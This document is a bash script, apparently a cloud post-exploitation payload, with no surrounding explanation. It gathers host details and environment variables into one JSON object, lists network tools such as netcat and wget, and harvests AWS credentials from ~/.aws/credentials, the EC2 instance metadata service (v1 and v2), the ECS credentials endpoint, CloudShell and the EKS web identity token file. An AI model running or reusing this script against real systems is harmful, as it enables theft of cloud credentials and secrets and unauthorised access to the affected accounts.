chmod +x ./jq
chmod +x ./amicontained
./jq --null-input \
    --arg id "`id`" \
    --arg printenv "`printenv`" \
    --arg os "`cat /etc/issue`" \
    --arg hostname "`hostname`" \
    --arg processes "`ps -aux`" \
    --arg mounts "`mount`" \
    --arg tools "`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`" \
    --arg amicontained "`./amicontained`" \
    --arg getlocalcreds "`cat ~/.aws/credentials`" \
    --arg curlgoogle "`curl google.com`" \
    --arg getec2metadatav1 "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/)`" \
    --arg getec2metadatav2 "$(TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\") && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/ -H \"X-aws-ec2-metadata-token: $TOKEN\") -H \"X-aws-ec2-metadata-token: $TOKEN\")" \
    --arg getecsmetadata "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" \
    --arg getekswebidentityfile "`cat $AWS_WEB_IDENTITY_TOKEN_FILE`" \
    --arg getcloudshell "`curl $AWS_CONTAINER_CREDENTIALS_FULL_URI -H \"Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN\"`" \
    '{"id": $id, "env": $printenv, "os": $os, "hostname": $hostname, "processes": $processes, "mounts": $mounts, "tools": $tools, "amicontained": $amicontained, "local-creds": $getlocalcreds, "curl-google": $curlgoogle, "ec2-metadata-v1": $getec2metadatav1, "ec2-metadata-v2": $getec2metadatav2, "ecs-metadata": $getecsmetadata, "eks-web-identity":$getekswebidentityfile, "cloud-shell": $getcloudshell}'

# 
# printf '{"whoami": "%q", "env": "%q"}' "`whoami`"  "`printenv`"

